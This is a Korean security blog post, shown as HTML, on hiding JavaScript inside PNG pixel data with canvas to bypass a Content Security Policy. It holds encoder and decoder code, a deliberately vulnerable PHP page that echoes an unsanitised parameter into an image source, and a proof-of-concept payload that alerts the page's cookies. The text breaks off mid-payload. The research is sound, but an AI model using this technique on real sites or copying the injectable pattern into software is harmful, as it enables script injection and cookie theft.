@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="google-site-verification" content="soS2al0KuMZmiyPzu87KFbqGSn0K9edQ8EkWp_m35n0" />
+  
+
+  <!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Hide JavaScript Code in PNG | Core-Research-Team</title>
+<meta name="generator" content="Jekyll v4.0.1" />
+<meta property="og:title" content="Hide JavaScript Code in PNG" />
+<meta name="author" content="gurumi907" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="라온화이트햇 핵심연구팀 조운삼" />
+<meta property="og:description" content="라온화이트햇 핵심연구팀 조운삼" />
+<link rel="canonical" href="http://202.182.127.225:4000/2020-10-01/Hide-JavaScript-Code-in-PNG-1d24960c8d174fce8729f7f8003fce4b" />
+<meta property="og:url" content="http://202.182.127.225:4000/2020-10-01/Hide-JavaScript-Code-in-PNG-1d24960c8d174fce8729f7f8003fce4b" />
+<meta property="og:site_name" content="Core-Research-Team" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-10-01T00:00:00+00:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"Hide JavaScript Code in PNG","dateModified":"2020-10-01T00:00:00+00:00","datePublished":"2020-10-01T00:00:00+00:00","author":{"@type":"Person","name":"gurumi907"},"url":"http://202.182.127.225:4000/2020-10-01/Hide-JavaScript-Code-in-PNG-1d24960c8d174fce8729f7f8003fce4b","mainEntityOfPage":{"@type":"WebPage","@id":"http://202.182.127.225:4000/2020-10-01/Hide-JavaScript-Code-in-PNG-1d24960c8d174fce8729f7f8003fce4b"},"description":"라온화이트햇 핵심연구팀 조운삼","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon.ico">
+
+  <!-- RSS -->
+  <link type="application/atom+xml" rel="alternate" href="http://202.182.127.225:4000/feed.xml" title="Core-Research-Team" />
+
+  <!-- Google Analytics-->
+  
+ 
+</head>
+
+
+  <body>
+
+    <nav class="nav">
+  <div class="nav-container">
+    <a href="/">
+      <h2 class="nav-title">RAON - Core Research Team</h2>
+    </a>
+    <ul>
+      <li><a href="/about">About</a></li>
+      <li><a href="/">Posts</a></li>
+    </ul>
+  </div>
+</nav>
+
+
+    <main>
+      <div class="post"> 
+   <h1 class="post-title">Hide JavaScript Code in PNG</h1>
+   <div class="post-line"></div>
+
+   
+      
+         
+            <span class="tag"><center><i>Web</i></center></span>
+         
+      
+   
+   
+   <ul>
+  <li><a href="#test-hello-world">Test “Hello, World!”</a></li>
+  <li><a href="#취약-웹사이트-예시">취약 웹사이트 예시</a></li>
+  <li><a href="#twitter에-이미지-게시">Twitter에 이미지 게시</a></li>
+  <li><a href="#exploit">Exploit</a></li>
+  <li><a href="#마치며">마치며</a></li>
+  <li><a href="#참고">참고</a></li>
+</ul>
+   
+   <p>라온화이트햇 핵심연구팀 조운삼</p>
+
+<p>얼마전 CSP를 우회하여 PNG 이미지에 Javascript를 숨길수 있다는 글을 보았고, 해당 내용의 이론적인 부분 번역하며 따라해본 내용을 정리해보려고 합니다.</p>
+
+<p>해당 게시글에서는 HTML Canvas를 사용하면 Javascript 코드를 PNG 이미지 속에 픽셀로 변환하여 숨길수 있다고 합니다.</p>
+
+<p>문서에 따르면 CanvasRenderingContext2D의 <code class="highlighter-rouge">putImageData</code> 와 <code class="highlighter-rouge">getImageData</code>, 그리고 <code class="highlighter-rouge">String.charCodeAt</code> 메소드의 사용으로 PNG 이미지 속에 숨겨진 문자열을 조합할 수 있습니다.</p>
+
+<hr />
+
+<h2 id="test-hello-world">Test “Hello, World!”</h2>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">function</span> <span class="nx">encode</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
+            <span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">length</span><span class="p">,</span>
+                <span class="nx">e</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">ceil</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">sqrt</span><span class="p">(</span><span class="nx">c</span> <span class="o">/</span> <span class="mi">3</span><span class="p">)),</span>
+                <span class="nx">f</span> <span class="o">=</span> <span class="nx">e</span><span class="p">,</span>
+                <span class="nx">g</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">canvas</span><span class="dl">"</span><span class="p">),</span>
+                <span class="nx">h</span> <span class="o">=</span> <span class="nx">g</span><span class="p">.</span><span class="nx">getContext</span><span class="p">(</span><span class="dl">"</span><span class="s2">2d</span><span class="dl">"</span><span class="p">);</span>
+            <span class="nx">g</span><span class="p">.</span><span class="nx">width</span> <span class="o">=</span> <span class="nx">e</span><span class="p">,</span> <span class="nx">g</span><span class="p">.</span><span class="nx">height</span> <span class="o">=</span> <span class="nx">f</span><span class="p">;</span>
+            <span class="kd">var</span> <span class="nx">j</span> <span class="o">=</span> <span class="nx">h</span><span class="p">.</span><span class="nx">getImageData</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">e</span><span class="p">,</span> <span class="nx">f</span><span class="p">),</span>
+                <span class="nx">k</span> <span class="o">=</span> <span class="nx">j</span><span class="p">.</span><span class="nx">data</span><span class="p">,</span>
+                <span class="nx">l</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+            <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">m</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">m</span> <span class="o">&lt;</span> <span class="nx">f</span><span class="p">;</span> <span class="nx">m</span><span class="o">++</span><span class="p">)</span>
+                <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">n</span> <span class="o">&lt;</span> <span class="nx">e</span><span class="p">;</span> <span class="nx">n</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="kd">var</span> <span class="nx">o</span> <span class="o">=</span> <span class="mi">4</span> <span class="o">*</span> <span class="p">(</span><span class="nx">m</span> <span class="o">*</span> <span class="nx">e</span><span class="p">)</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="nx">n</span><span class="p">,</span>
+                        <span class="nx">p</span> <span class="o">=</span> <span class="nx">a</span><span class="p">[</span><span class="nx">l</span><span class="o">++</span><span class="p">],</span>
+                        <span class="nx">q</span> <span class="o">=</span> <span class="nx">a</span><span class="p">[</span><span class="nx">l</span><span class="o">++</span><span class="p">],</span>
+                        <span class="nx">r</span> <span class="o">=</span> <span class="nx">a</span><span class="p">[</span><span class="nx">l</span><span class="o">++</span><span class="p">];</span>
+                    <span class="p">(</span><span class="nx">p</span> <span class="o">||</span> <span class="nx">q</span> <span class="o">||</span> <span class="nx">r</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">p</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">k</span><span class="p">[</span><span class="nx">o</span><span class="p">]</span> <span class="o">=</span> <span class="nx">ord</span><span class="p">(</span><span class="nx">p</span><span class="p">)),</span> <span class="nx">q</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">k</span><span class="p">[</span><span class="nx">o</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">ord</span><span class="p">(</span><span class="nx">q</span><span class="p">)),</span> <span class="nx">r</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">k</span><span class="p">[</span><span class="nx">o</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">ord</span><span class="p">(</span><span class="nx">r</span><span class="p">)),</span> <span class="nx">k</span><span class="p">[</span><span class="nx">o</span> <span class="o">+</span> <span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mi">255</span><span class="p">)</span>
+                <span class="p">}</span>
+            <span class="k">return</span> <span class="nx">h</span><span class="p">.</span><span class="nx">putImageData</span><span class="p">(</span><span class="nx">j</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="nx">h</span><span class="p">.</span><span class="nx">canvas</span><span class="p">.</span><span class="nx">toDataURL</span><span class="p">()</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="kd">var</span> <span class="nx">ord</span> <span class="o">=</span> <span class="kd">function</span> <span class="nx">ord</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">a</span> <span class="o">+</span> <span class="dl">""</span><span class="p">,</span>
+            <span class="nx">e</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="mi">55296</span> <span class="o">&lt;=</span> <span class="nx">e</span> <span class="o">&amp;&amp;</span> <span class="mi">56319</span> <span class="o">&gt;=</span> <span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="mi">1</span> <span class="o">===</span> <span class="nx">c</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="k">return</span> <span class="nx">e</span><span class="p">;</span>
+            <span class="kd">var</span> <span class="nx">f</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+            <span class="k">return</span> <span class="mi">1024</span> <span class="o">*</span> <span class="p">(</span><span class="nx">e</span> <span class="o">-</span> <span class="mi">55296</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="nx">f</span> <span class="o">-</span> <span class="mi">56320</span><span class="p">)</span> <span class="o">+</span> <span class="mi">65536</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="mi">56320</span> <span class="o">&lt;=</span> <span class="nx">e</span> <span class="o">&amp;&amp;</span> <span class="mi">57343</span> <span class="o">&gt;=</span> <span class="nx">e</span> <span class="p">?</span> <span class="nx">e</span> <span class="p">:</span> <span class="nx">e</span>
+    <span class="p">},</span>
+    <span class="nx">d</span> <span class="o">=</span> <span class="nb">document</span><span class="p">,</span>
+    <span class="nx">b</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">body</span><span class="p">,</span>
+    <span class="nx">img</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Image</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">stringenc</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">Hello, World!</span><span class="dl">"</span><span class="p">;</span>
+    <span class="nx">img</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">encode</span><span class="p">(</span><span class="nx">stringenc</span><span class="p">),</span> <span class="nx">b</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">""</span><span class="p">,</span> <span class="nx">b</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">img</span><span class="p">)</span>
+<span class="p">})();</span>
+</code></pre></div></div>
+
+<p>위 코드는 <code class="highlighter-rouge">stringenc</code> 에 입력한 문자열을 각 이미지 픽셀의 R,G,B 으로 입력하여 <code class="highlighter-rouge">putImageData</code> 를 사용하여 이미지를 만드는 코드 입니다.</p>
+
+<p><img src="/assets/2010sam.png" alt="/assets/2010sam.png" /></p>
+
+<p>위 <code class="highlighter-rouge">javascript</code> 코드를 브라우저 <code class="highlighter-rouge">script console</code> 에 입력하면 위 그림과 같은 화면이 나타납니다. 각 픽셀의 R,G,B에는 <code class="highlighter-rouge">stringenc</code> 의 1자씩 들어가게 되어 3개의 글자가 1개의 픽셀을 이루고 있습니다.</p>
+
+<p><img src="/assets/2010sam1.png" alt="/assets/2010sam1.png" /></p>
+
+<p>위 그림은 <code class="highlighter-rouge">stringenc</code> 을 이미지화하는 과정을 담은 그림입니다.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">t</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="dl">"</span><span class="s2">img</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
+<span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">,</span> <span class="nx">c</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">canvas</span><span class="dl">"</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">cs</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">style</span><span class="p">,</span>
+    <span class="nx">cx</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">getContext</span><span class="p">(</span><span class="dl">"</span><span class="s2">2d</span><span class="dl">"</span><span class="p">),</span>
+    <span class="nx">w</span> <span class="o">=</span> <span class="nx">t</span><span class="p">.</span><span class="nx">offsetWidth</span><span class="p">,</span>
+    <span class="nx">h</span> <span class="o">=</span> <span class="nx">t</span><span class="p">.</span><span class="nx">offsetHeight</span><span class="p">;</span><span class="o">*</span>
+<span class="nx">c</span><span class="p">.</span><span class="nx">width</span> <span class="o">=</span> <span class="nx">w</span><span class="p">;</span>
+<span class="nx">c</span><span class="p">.</span><span class="nx">height</span> <span class="o">=</span> <span class="nx">h</span><span class="p">;</span>
+<span class="nx">cs</span><span class="p">.</span><span class="nx">width</span> <span class="o">=</span> <span class="nx">w</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">px</span><span class="dl">"</span><span class="p">;</span>
+<span class="nx">cs</span><span class="p">.</span><span class="nx">height</span> <span class="o">=</span> <span class="nx">h</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">px</span><span class="dl">"</span><span class="p">;</span>
+<span class="nx">cx</span><span class="p">.</span><span class="nx">drawImage</span><span class="p">(</span><span class="nx">t</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="nx">cx</span><span class="p">.</span><span class="nx">getImageData</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">w</span><span class="p">,</span> <span class="nx">h</span><span class="p">).</span><span class="nx">data</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="dl">""</span><span class="p">,</span>
+    <span class="nx">l</span> <span class="o">=</span> <span class="nx">x</span><span class="p">.</span><span class="nx">length</span><span class="p">,</span>
+    <span class="nx">p</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">l</span><span class="p">;</span> <span class="nx">i</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">x</span><span class="p">[</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">0</span><span class="p">])</span> <span class="nx">a</span> <span class="o">+=</span> <span class="nx">s</span><span class="p">(</span><span class="nx">x</span><span class="p">[</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">0</span><span class="p">]);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">x</span><span class="p">[</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">])</span> <span class="nx">a</span> <span class="o">+=</span> <span class="nx">s</span><span class="p">(</span><span class="nx">x</span><span class="p">[</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">x</span><span class="p">[</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">2</span><span class="p">])</span> <span class="nx">a</span> <span class="o">+=</span> <span class="nx">s</span><span class="p">(</span><span class="nx">x</span><span class="p">[</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]);</span>
+<span class="p">}</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="dl">"</span><span class="s2">body</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">innerHTML</span><span class="o">=</span><span class="nx">a</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p><img src="/assets/2010sam2.png" alt="/assets/2010sam2.png" /></p>
+
+<p>위 코드는 보이듯이 <code class="highlighter-rouge">getImageData</code> 를 사용하여 이미지 속에 감춰진 문자열을 뽑아내어 복원한는 과정입니다. <code class="highlighter-rouge">getImageData</code> 를 사용하게 되면 이미지에 대한 data는 배열의 형태로 반환되어집니다. 그 과정에서 얻어지는 배열의 순서는 다음과 같습니다. <code class="highlighter-rouge">[pixel 1R, pixel 1G, pixel 1B, pixel 1Alpah, ..., pixelNR, pixelNG, pixelNB, pixelNAlpha]</code></p>
+
+<hr />
+
+<h2 id="취약-웹사이트-예시">취약 웹사이트 예시</h2>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+	<span class="nb">header</span><span class="p">(</span><span class="s2">"Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval'; img-src 'self' https://pbs.twimg.com"</span><span class="p">)</span>
+<span class="cp">?&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"lang"</span><span class="p">]</span> <span class="cp">?&gt;</span><span class="s">/flag.png"</span><span class="err">?</span>
+<span class="err">&lt;/</span><span class="na">body</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>위 사이트는 직접 로드한 JS코드만 허용, Twitter에서 원격으로 가져오는 이미지를 허용하는 CSP를 적용하고 있습니다.</p>
+
+<p>lang 파라미터를 통해 표시할 이미지의 주소를 가져오도록하는 간단한 웹 사이트 예시입니다.</p>
+
+<hr />
+
+<h2 id="twitter에-이미지-게시">Twitter에 이미지 게시</h2>
+
+<p>앞서 진행한 테스트에서 만든 이미지는 크기가 너무 작아 Twitter에 게시되지 않습니다.  따라서, 아래와 같이 이미지 크기를 크게 만들어서 게시해주도록 합니다.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">function</span> <span class="nx">encode</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
+            <span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">length</span><span class="p">,</span>
+                <span class="nx">e</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">ceil</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">sqrt</span><span class="p">(</span><span class="nx">c</span> <span class="o">/</span> <span class="mi">3</span><span class="p">)),</span>
+                <span class="nx">f</span> <span class="o">=</span> <span class="nx">e</span><span class="p">,</span>
+                <span class="nx">g</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">canvas</span><span class="dl">"</span><span class="p">),</span>
+                <span class="nx">h</span> <span class="o">=</span> <span class="nx">g</span><span class="p">.</span><span class="nx">getContext</span><span class="p">(</span><span class="dl">"</span><span class="s2">2d</span><span class="dl">"</span><span class="p">);</span>
+            <span class="nx">g</span><span class="p">.</span><span class="nx">width</span> <span class="o">=</span> <span class="nx">e</span><span class="p">,</span> <span class="nx">g</span><span class="p">.</span><span class="nx">height</span> <span class="o">=</span> <span class="nx">f</span><span class="p">;</span>
+            <span class="kd">var</span> <span class="nx">j</span> <span class="o">=</span> <span class="nx">h</span><span class="p">.</span><span class="nx">getImageData</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">e</span><span class="p">,</span> <span class="nx">f</span><span class="p">),</span>
+                <span class="nx">k</span> <span class="o">=</span> <span class="nx">j</span><span class="p">.</span><span class="nx">data</span><span class="p">,</span>
+                <span class="nx">l</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+            <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">m</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">m</span> <span class="o">&lt;</span> <span class="nx">f</span><span class="p">;</span> <span class="nx">m</span><span class="o">++</span><span class="p">)</span>
+                <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">n</span> <span class="o">&lt;</span> <span class="nx">e</span><span class="p">;</span> <span class="nx">n</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="kd">var</span> <span class="nx">o</span> <span class="o">=</span> <span class="mi">4</span> <span class="o">*</span> <span class="p">(</span><span class="nx">m</span> <span class="o">*</span> <span class="nx">e</span><span class="p">)</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="nx">n</span><span class="p">,</span>
+                        <span class="nx">p</span> <span class="o">=</span> <span class="nx">a</span><span class="p">[</span><span class="nx">l</span><span class="o">++</span><span class="p">],</span>
+                        <span class="nx">q</span> <span class="o">=</span> <span class="nx">a</span><span class="p">[</span><span class="nx">l</span><span class="o">++</span><span class="p">],</span>
+                        <span class="nx">r</span> <span class="o">=</span> <span class="nx">a</span><span class="p">[</span><span class="nx">l</span><span class="o">++</span><span class="p">];</span>
+                    <span class="p">(</span><span class="nx">p</span> <span class="o">||</span> <span class="nx">q</span> <span class="o">||</span> <span class="nx">r</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">p</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">k</span><span class="p">[</span><span class="nx">o</span><span class="p">]</span> <span class="o">=</span> <span class="nx">ord</span><span class="p">(</span><span class="nx">p</span><span class="p">)),</span> <span class="nx">q</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">k</span><span class="p">[</span><span class="nx">o</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">ord</span><span class="p">(</span><span class="nx">q</span><span class="p">)),</span> <span class="nx">r</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">k</span><span class="p">[</span><span class="nx">o</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">ord</span><span class="p">(</span><span class="nx">r</span><span class="p">)),</span> <span class="nx">k</span><span class="p">[</span><span class="nx">o</span> <span class="o">+</span> <span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mi">255</span><span class="p">)</span>
+                <span class="p">}</span>
+            <span class="k">return</span> <span class="nx">h</span><span class="p">.</span><span class="nx">putImageData</span><span class="p">(</span><span class="nx">j</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="nx">h</span><span class="p">.</span><span class="nx">canvas</span><span class="p">.</span><span class="nx">toDataURL</span><span class="p">()</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="kd">var</span> <span class="nx">ord</span> <span class="o">=</span> <span class="kd">function</span> <span class="nx">ord</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">a</span> <span class="o">+</span> <span class="dl">""</span><span class="p">,</span>
+            <span class="nx">e</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="mi">55296</span> <span class="o">&lt;=</span> <span class="nx">e</span> <span class="o">&amp;&amp;</span> <span class="mi">56319</span> <span class="o">&gt;=</span> <span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="mi">1</span> <span class="o">===</span> <span class="nx">c</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="k">return</span> <span class="nx">e</span><span class="p">;</span>
+            <span class="kd">var</span> <span class="nx">f</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+            <span class="k">return</span> <span class="mi">1024</span> <span class="o">*</span> <span class="p">(</span><span class="nx">e</span> <span class="o">-</span> <span class="mi">55296</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="nx">f</span> <span class="o">-</span> <span class="mi">56320</span><span class="p">)</span> <span class="o">+</span> <span class="mi">65536</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="mi">56320</span> <span class="o">&lt;=</span> <span class="nx">e</span> <span class="o">&amp;&amp;</span> <span class="mi">57343</span> <span class="o">&gt;=</span> <span class="nx">e</span> <span class="p">?</span> <span class="nx">e</span> <span class="p">:</span> <span class="nx">e</span>
+    <span class="p">},</span>
+    <span class="nx">d</span> <span class="o">=</span> <span class="nb">document</span><span class="p">,</span>
+    <span class="nx">b</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">body</span><span class="p">,</span>
+    <span class="nx">img</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Image</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">stringenc</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">function asd() {</span><span class="se">\</span><span class="s2">
+        var d = document;</span><span class="se">\</span><span class="s2">
+        var c = 'cookie';</span><span class="se">\</span><span class="s2">
+        alert(d[c]);</span><span class="se">\</span><span class="s2">
+    };asd();/*Lorem ipsum dolor sit amet, consectetur adipiscing elit. Etiam aliquam blandit metus vel elementum. Mauris mi tortor, congue eget fringilla id, tempus a tellus. Morbi laoreet vitae ipsum vel dapibus. Nunc eu faucibus ligula. Donec maximus malesuada justo. Nulla congue, risus quis dapibus porttitor, metus quam rutrum dolor, ac maximus nibh metus quis enim. Aenean hendrerit venenatis massa ac gravida. Donec at nisi quis ex sollicitudin bibendum sit amet ac quam.</span><span class="se">\</span><span class="s2">
+    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.</span><span class="se">\</span><span class="s2">
+    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.</span><span class="se">\</span><span class="s2">
+    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.</span><span class="se">\</span><span class="s2">
